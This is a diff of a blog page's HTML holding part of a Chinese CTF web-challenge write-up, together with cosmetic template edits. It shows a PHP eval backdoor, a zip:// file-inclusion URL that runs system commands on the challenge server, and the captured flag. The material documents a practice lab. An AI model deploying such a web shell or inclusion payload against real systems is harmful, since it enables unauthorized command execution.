@@ -438,7 +438,7 @@ height:50vh;
 <p>先检查地址是否有效，然后利用之前传的后门进行命令执行。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>最后的 payload 如下：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:30117/?page=zip://uP1O4Ds/Ah86F1AZxgsLc8UUjkHPZRKMoCM3XUdT_test.png%23test/test&amp;a=echo%20system(%27ls%27);</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> test.png%23test&amp;a=echo%20system(%27ls%27); 这样是不行的，网上都是这个路子==，找时间整理下</span><br><span class="line"></span><br><span class="line">CSS flag-Edi98vJF8hnIp.txt index.html index.php js uP1O4Ds upload.php upload.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:30117/?page=zip://uP1O4Ds/Ah86F1AZxgsLc8UUjkHPZRKMoCM3XUdT_test.png%23test/test&amp;a=echo%20system(%27ls%27);</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> test.png%23test&amp;a=<span class="built_in">echo</span>%20system(%27ls%27); 这样是不行的，网上都是这个路子==，找时间整理下</span></span><br><span class="line"></span><br><span class="line">CSS flag-Edi98vJF8hnIp.txt index.html index.php js uP1O4Ds upload.php upload.php</span><br></pre></td></tr></table></figure>
 <p>然后 cat flag</p>
 <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">111.198</span>.<span class="number">29.45</span>:<span class="number">30117</span>/?page=zip://uP<span class="number">1</span>O<span class="number">4</span>Ds/Ah<span class="number">86</span>F<span class="number">1</span>AZxgsLc<span class="number">8</span>UUjkHPZRKMoCM<span class="number">3</span>XUdT_test.png<span class="symbol">%23</span>test/test&amp;a=echo<span class="symbol">%20</span>system(<span class="symbol">%27</span>cat<span class="symbol">%20</span>./flag-Ed<span class="keyword">i98</span>vJF<span class="number">8</span>hnIp.txt<span class="symbol">%27</span>)<span class="comment">;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">xctf&#123;3fbbe15371c9cd42ec1a698d7660849a&#125; xctf&#123;3fbbe15371c9cd42ec1a698d7660849a&#125;</span></span><br></pre></td></tr></table></figure>
     </article>
@@ -582,10 +582,10 @@ height:50vh;
         
         
         <span id="busuanzi_container_site_pv" class="theme-info">
-            &nbsp;&nbsp;|&nbsp;&nbsp;本站总访问量<span id="busuanzi_value_site_pv"></span>次
+            &nbsp;&nbsp;|&nbsp;&nbsp;总访问量<span id="busuanzi_value_site_pv"></span>次
         </span>
         <span id="busuanzi_container_site_uv" class="theme-info">
-            &nbsp;&nbsp;|&nbsp;&nbsp;本站访客数<span id="busuanzi_value_site_uv"></span>人次
+            &nbsp;&nbsp;|&nbsp;&nbsp;访客数<span id="busuanzi_value_site_uv"></span>人次
         </span>
         <!-- <span id="busuanzi_container_site_pv">阅读次数: <span id="busuanzi_value_site_pv"></span> : )</span> -->
         
@@ -623,8 +623,6 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
     
     
     
@@ -913,13 +911,13 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="Writeup"><span class="iconfont-archer">&#xe606;</span>Writeup</span>
     
-        <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
-    
         <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
     
         <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
     
         <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
+    
+        <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
     
         <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
     
